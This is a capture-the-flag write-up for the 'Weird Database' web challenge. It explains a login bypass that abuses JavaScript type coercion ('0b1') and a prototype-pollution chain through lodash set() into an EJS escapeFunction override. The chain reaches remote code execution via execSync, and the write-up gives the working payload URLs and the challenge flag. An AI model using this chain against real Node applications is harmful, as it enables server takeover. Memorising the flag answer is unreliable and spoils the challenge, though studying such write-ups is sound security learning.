## Weird Database  

<img src="images/chall.png" width=600>

### Vulnerability Analysis  

Even before analysing the source code, looking at `package.json` already raises a few red flags.  

The webpage uses `ejs@3.1.8` and `lodash@4.17.15`, which have [RCE](https://security.snyk.io/vuln/SNYK-JS-EJS-2803307) and [prototype pollution](https://security.snyk.io/vuln/SNYK-JS-LODASH-567746) CVEs respectively.  

```json
{
  "dependencies": {
    "cookie-parser": "^1.4.6",
    "ejs": "^3.1.8",
    "express": "^4.18.2",
    "lodash": "4.17.15"
  }
}
```

The dist also provides an example flag file, but it isn't referenced anywhere in the backend code, which further hints towards RCE.  

<img src="images/flag_file.png" width=600>

Looking at the backend code, there is an `/api/set` endpoint which uses the lodash `set()` function, which is our prototype pollution vector. Our goal would be to exploit this vuln to affect the EJS `render()` call in the index page.  

```js
app.get('/', (req, res) => {
   res.render('index', { db: JSON.stringify(DB) });
})
...
app.get('/api/set', (req, res) => {
   const { key, value } = req.query;
   _.set(DB, key, value);
   res.json({ error: false, msg: "success" });
})
```

However, the `/api/set` endpoint is protected by middleware, which requires us to authenticate as `admin` to proceed.  

The UID and password checks use `==` for loose comparison and `parseInt()` for the final UID check, which hints towards a type coercion bug.  

```js
app.use('/api', (req, res, next) => {
   let uid = req.cookies.uid;
   let password = req.cookies.password;

   if (uid == undefined || password == undefined) {
      res.json({ error: true, msg: "Unauthorized" });
      return false;
   }

   let found = false;
   for (let v of users.entries()) {
      if (v[0].uid == uid && v[0].password == password) {
         found = true;
      }
   }

   if (!found || parseInt(uid) != 0) {
      res.json({ error: true, msg: "Unauthorized" });
      return false;
   }

   next();
})

...

users.add({ username: "admin", password: hashPasswd(crypto.randomBytes(64).toString('hex')), uid: lastUserId++ })
```

### Login Bypass  

Whenever we register a new user, the backend increments `lastUserID` and sets it as the the UID. This means that if we create a new user, our UID will be `1`.  

```js
app.post('/register', (req, res) => {
   const { username, password } = req.body;

   if (!username || !password)
      return res.json({ error: true, msg: "Enter username and password!" });

   for (let v of users.entries())
      if (v[0].username == username)
         return res.json({ error: true, msg: "Username exists!" });

   let hashedPassword = hashPasswd(password);
   let uid = lastUserId;
   lastUserId += 1;

   users.add({
      username: username,
      password: hashedPassword,
      uid: uid
   })

   res.cookie('uid', uid);
   res.cookie('passwd', hashedPassword);
   res.json({ error: false, msg: "Register success!" });
})
```

We can set the `password` cookie to the SHA256 hash of our own, then craft a UID that will match both our user and the admin user.  

```js
app.use('/api', (req, res, next) => {
   let uid = req.cookies.uid;
   let password = req.cookies.password;
    ...
   let found = false;
   for (let v of users.entries()) {
      if (v[0].uid == uid && v[0].password == password) {
         found = true;
      }
   }
   ...
```

To do this, we can leverage JavaScript's type coercion quirks. The loose comparison `v[0].username == username` means passing in the binary representation of the UID passes the check.  

By passing in the binary `0b1`, the loose comparison evaluates it to `1`, which is our UID, but `parseInt()` stops at `b`, thus evaluating it to `0` and authenticating us as admin.  

```js
"0b1" == 1  // true
parseInt("0b1") == 0    // 0 == 0  ->  true
```

### RCE  

Now that we have access to the `/api` endpoint, we can exploit the CVEs we found earlier.  

The `render()` call doesn't pass in the view options by default, so we need to use prototype pollution to do so.   

```js
app.get('/', (req, res) => {
   res.render('index', { db: JSON.stringify(DB) });
})
```

We can pollute the `settings` object through `__proto__`, then control the view options to enable client-side rendering. After that, we can just override `escapeFunction()` to get RCE.  

```js
/api/set?key=__proto__.settings[view options][client]&value=True
/api/set?key=__proto__.settings[view options][escapeFunction]&value=1;return process.mainModule.require('child_process').execSync('cat flag').toString()
```

After running the payloads, revisiting the index page will display the flag.  

<img src="images/flag.png" width=600>

Flag: `DH{It's_a_r3a11y_w3ird_databas3,_Isn't_it?}`